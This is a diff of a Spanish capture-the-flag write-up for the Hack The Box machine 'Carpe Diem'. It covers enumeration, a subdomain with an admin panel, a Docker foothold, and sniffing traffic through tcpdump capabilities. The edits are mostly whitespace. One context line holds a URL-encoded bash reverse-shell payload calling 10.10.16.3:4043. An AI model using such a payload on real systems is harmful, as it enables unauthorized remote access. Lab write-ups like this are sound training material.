@@ -14,6 +14,7 @@ la máquina como root.
 
 ![img](assets/carpeDime/portada.ong)
 ___________
+
 ### Enumeración namp
 
 ```bash
@@ -39,6 +40,7 @@ Testeando un poco la web no parece que haya gran cosa, así que el siguiente pas
 ```
 
 ![img](assets/carpeDime/cap3.png)
+
 Agregamos este sub-dominio a nuestro archivo `/etc/hosts`. 
 Dentro de **portal.carpediem.htb** vemos que estamos ante una web de venta de motocicletas, con **wig** y **wappalayzer** realizamos una primera enumeración para encontrar el servidor y el lenguaje de programación que corre en el back-end.
 
@@ -59,7 +61,6 @@ Visitando un poco todos los directorios me llama la atención el **admin**, lo p
 ![img](assets/carpeDime/cap7.png)
 
 Ahora volvemos a la pagina principal y procedemos a registrarnos, me llama la atención que ya estando registrados si vamos al panel anterior de **admin** nos devuelve una mensaje de acceso denegado.
-
 
 ![img](assets/carpeDime/cap8.png)
 
@@ -95,6 +96,7 @@ Simplemente inyectamos el siguiente **payload** y nos metemos dentro de la máqu
 bash -c "bash -i >%26 /dev/tcp/10.10.16.3/4043 0>%261"
 ```
 ___________
+
 ## DENTRO DE LA MÁQUINA
 
 Dentro de la máquina podemos ver que estamos dentro de un contenedor **docker** como el usuario `www-data`.
@@ -157,7 +159,7 @@ Leyendo los tickets también sabemos que el nuevo empleado se llama Horace Flacc
 ```
 
 Una vez conectados encontramos la primer bandera.
-_____________
+
 ## ESCALADA DE PRIVILEGIOS
 
 Enumerando el sistema vemos que hay varios usuarios y varias conexiones, también encuentro binarios con capabilities especiales, como tcpdump que tiene las capabilities `cap_net_admin` y `cap_net_raw+eip`. La capabilitie `cap_net_raw` nos permite abrir raw sockets para capturar paquetes, mientras que `cap_net_admin` nos permite entre otras cosas poner la interfaz en modo promiscuo, lo que combinado nos da capacidad de interceptar todo el tráfico de la red.
